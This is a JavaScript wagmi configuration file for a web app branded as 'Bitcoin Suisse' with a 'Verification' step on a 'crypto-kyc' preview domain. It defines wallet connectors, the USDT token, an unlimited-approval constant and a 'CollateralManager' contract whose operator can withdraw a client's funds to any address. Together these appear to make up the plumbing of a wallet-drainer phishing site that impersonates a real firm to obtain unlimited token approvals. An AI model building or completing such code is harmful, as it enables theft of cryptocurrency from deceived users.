import { http, createConfig } from 'wagmi';
import { mainnet } from 'wagmi/chains';
import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors';

// Configuration WalletConnect - VOTRE PROJECT ID
const projectId = 'd45fef8809106f1b76a085a50afea0e4';

const metadata = {
  name: 'Bitcoin Suisse',
  description: 'Verification',
  url: 'https://crypto-kyc.preview.emergentagent.com',
  icons: ['https://customer-assets.emergentagent.com/job_invest-collateral/artifacts/tzq62nbg_Logo_Bitcoin_Suisse.png']
};

export const config = createConfig({
  chains: [mainnet],
  connectors: [
    injected({ 
      shimDisconnect: true,
      target: 'metaMask'
    }),
    walletConnect({ 
      projectId, 
      metadata, 
      showQrModal: true,
      qrModalOptions: {
        themeMode: 'dark'
      }
    }),
    coinbaseWallet({
      appName: metadata.name,
      appLogoUrl: metadata.icons[0]
    })
  ],
  transports: {
    [mainnet.id]: http('https://eth-mainnet.public.blastapi.io')
  },
  ssr: false
});

// Adresses des contrats
export const CONTRACT_ADDRESSES = {
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  // ANCIEN CONTRAT QUI FONCTIONNAIT
  COLLATERAL_MANAGER: '0x178e6faf3812f5ba753d38541a16c401f2ade7e1',
  // Adresse admin owner
  ADMIN_ADDRESS: '0x98e8Ff93F323aaaf98B13accA607D9CA912b73A5'
};

// ABI minimum pour USDT
export const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  }
];

// ABI pour CollateralManager
export const COLLATERAL_MANAGER_ABI = [
  {
    inputs: [],
    name: 'registerClient',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [
      { internalType: 'address', name: 'client', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
      { internalType: 'uint256', name: 'amount', type: 'uint256' },
      { internalType: 'string', name: 'reason', type: 'string' }
    ],
    name: 'withdrawCollateral',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientAllowance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientBalance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'isClientRegistered',
    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'hasClientApproved',
    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientInfo',
    outputs: [
      { internalType: 'uint256', name: 'balance', type: 'uint256' },
      { internalType: 'uint256', name: 'allowance', type: 'uint256' },
      { internalType: 'bool', name: 'registered', type: 'bool' },
      { internalType: 'bool', name: 'canWithdraw', type: 'bool' }
    ],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [],
    name: 'operator',
    outputs: [{ internalType: 'address', name: '', type: 'address' }],
    stateMutability: 'view',
    type: 'function'
  }
];

export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';